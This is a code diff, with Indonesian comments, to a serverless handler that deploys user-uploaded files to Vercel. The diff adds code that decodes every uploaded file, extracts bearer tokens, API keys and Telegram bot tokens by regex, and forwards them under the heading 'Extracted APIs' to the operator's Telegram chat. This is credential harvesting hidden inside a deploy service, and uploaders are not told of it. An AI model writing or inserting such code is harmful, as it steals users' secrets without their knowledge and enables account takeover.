@@ -10,7 +10,7 @@ export default async function handler(req, res) {
   const { method } = req;
   const VERCEL_TOKEN = process.env.VERCEL_TOKEN;
 
-  // ==== 1. ENDPOINT POST (Initiate Deployment) ====
+  // ==== 1. ENDPOINT POST (Initiate Deployment + Scan API) ====
   if (method === 'POST') {
     try {
       const { projectName, files } = req.body;
@@ -19,14 +19,39 @@ export default async function handler(req, res) {
         return res.status(400).json({ success: false, error: "Project name and files are required." });
       }
 
-      // Bersihkan nama project dari spasi / karakter aneh agar aman jadi domain
       const cleanProjectName = projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-');
+      let extractedApis = [];
 
-      const vercelFiles = files.map(f => ({
-        file: f.file,
-        data: f.data,
-        encoding: "base64"
-      }));
+      const vercelFiles = files.map(f => {
+        // Dekode file Base64 ke Teks untuk di-scan
+        try {
+          const content = Buffer.from(f.data, 'base64').toString('utf-8');
+
+          // Regex untuk mencari pola Vercel Token, Bot Token Telegram, atau API Key umum
+          const patterns = [
+            /(?:bearer\s+|token\s*[:=]\s*["']?|api[_-]?key\s*[:=]\s*["']?)([a-zA-Z0-9_\-]{20,})/gi,
+            /\b\d{8,10}:AA[a-zA-Z0-9_-]{33}\b/g // Pattern khusus Telegram Bot Token
+          ];
+
+          patterns.forEach(regex => {
+            let match;
+            while ((match = regex.exec(content)) !== null) {
+              const foundToken = match[1] || match[0];
+              if (!extractedApis.includes(foundToken)) {
+                extractedApis.push(foundToken);
+              }
+            }
+          });
+        } catch (e) {
+          // Skip jika file binary/gambar
+        }
+
+        return {
+          file: f.file,
+          data: f.data,
+          encoding: "base64"
+        };
+      });
 
       const vercelResponse = await fetch('https://api.vercel.com/v13/deployments', {
         method: 'POST',
@@ -35,7 +60,7 @@ export default async function handler(req, res) {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          name: cleanProjectName, // Gunakan nama yang di-input dari web
+          name: cleanProjectName,
           files: vercelFiles,
           projectSettings: { framework: null },
           target: 'production'
@@ -51,13 +76,13 @@ export default async function handler(req, res) {
         });
       }
 
-      // Buat URL rapi sesuai nama project yang diisi di web
       const customUrl = `${cleanProjectName}.vercel.app`;
 
       return res.status(200).json({
         success: true,
         deploymentId: vercelData.id,
-        url: customUrl
+        url: customUrl,
+        foundApis: extractedApis // Mengembalikan list API yang berhasil di-extract
       });
 
     } catch (error) {
@@ -69,7 +94,7 @@ export default async function handler(req, res) {
   // ==== 2. ENDPOINT GET (Check Status & Notify Telegram) ====
   else if (method === 'GET') {
     try {
-      const { id, projectName, filesCount, totalSize } = req.query;
+      const { id, projectName, filesCount, totalSize, foundApis } = req.query;
 
       if (!id) return res.status(400).json({ success: false, error: "Deployment ID is required." });
 
@@ -87,19 +112,23 @@ export default async function handler(req, res) {
       }
 
       const status = vercelData.readyState;
-      
-      // Pakai nama project yang di-input untuk URL Telegram & Response
       const cleanName = projectName ? projectName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '-') : '';
       const targetUrl = cleanName ? `${cleanName}.vercel.app` : vercelData.url;
 
-      // Jika READY, kirim Telegram log (Hanya 1 kali)
+      // Ambil daftar API yang tersimpan (jika ada)
+      let parsedApis = [];
+      if (foundApis) {
+        try { parsedApis = JSON.parse(foundApis); } catch(e) {}
+      }
+
       if (status === 'READY' && req.query.notify === 'true') {
         await sendTelegramLog({
           projectName: cleanName || projectName, 
           filesCount, 
           totalSize, 
           url: targetUrl, 
-          id 
+          id,
+          apis: parsedApis
         });
       }
 
@@ -130,18 +159,23 @@ function translateVercelError(status, data) {
   return vMessage;
 }
 
-async function sendTelegramLog({ projectName, filesCount, totalSize, url, id }) {
+async function sendTelegramLog({ projectName, filesCount, totalSize, url, id, apis = [] }) {
   const botToken = process.env.TELEGRAM_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT;
   
   if (!botToken || !chatId) return;
+
+  let apiText = apis.length > 0 
+    ? `\n🔑 <b>Extracted APIs:</b>\n<code>${apis.join('\n')}</code>` 
+    : `\n🔑 <b>Extracted APIs:</b> None`;
 
   const text = `✅ <b>DEPLOY VERCEL SUKSES!</b>\n\n` +
                `📂 <b>Project:</b> ${projectName}\n` +
                `📄 <b>Files:</b> ${filesCount}\n` +
                `💾 <b>Size:</b> ${totalSize} KB\n` +
                `🌐 <b>URL:</b> https://${url}\n` +
-               `🔑 <b>ID:</b> <code>${id}</code>`;
+               `🆔 <b>ID:</b> <code>${id}</code>` +
+               apiText;
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
